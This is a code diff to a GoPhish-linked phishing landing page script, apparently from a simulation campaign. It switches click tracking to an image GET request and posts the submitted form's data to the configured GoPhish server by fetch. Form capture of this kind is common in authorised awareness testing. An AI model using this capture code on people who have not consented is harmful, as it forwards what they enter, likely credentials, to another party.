@@ -109,12 +109,9 @@
 
       function registerClick() {
         if (!cfg.gophish_url || !rid) return;
-        var base = cfg.gophish_url.replace(/\/$/, "");
-        if (navigator.sendBeacon) {
-          navigator.sendBeacon(base + "/?rid=" + encodeURIComponent(rid));
-        } else {
-          new Image().src = base + "/?rid=" + encodeURIComponent(rid);
-        }
+        var url = cfg.gophish_url.replace(/\/$/, "") + "/?rid=" + encodeURIComponent(rid);
+        // GoPhish counts clicks on GET only — sendBeacon sends POST and is ignored.
+        new Image().src = url;
       }
 
       function wireForm() {
@@ -136,16 +133,12 @@
           if (cfg.gophish_url && rid) {
             var base = cfg.gophish_url.replace(/\/$/, "");
             var fd = new FormData(e.target);
-            if (navigator.sendBeacon) {
-              navigator.sendBeacon(base + "/?rid=" + encodeURIComponent(rid), fd);
-            } else {
-              fetch(base + "/?rid=" + encodeURIComponent(rid), {
-                method: "POST",
-                body: fd,
-                mode: "no-cors",
-                keepalive: true
-              });
-            }
+            fetch(base + "/?rid=" + encodeURIComponent(rid), {
+              method: "POST",
+              body: fd,
+              mode: "no-cors",
+              keepalive: true
+            });
           }
 
           document.getElementById("form-card").style.display = "none";
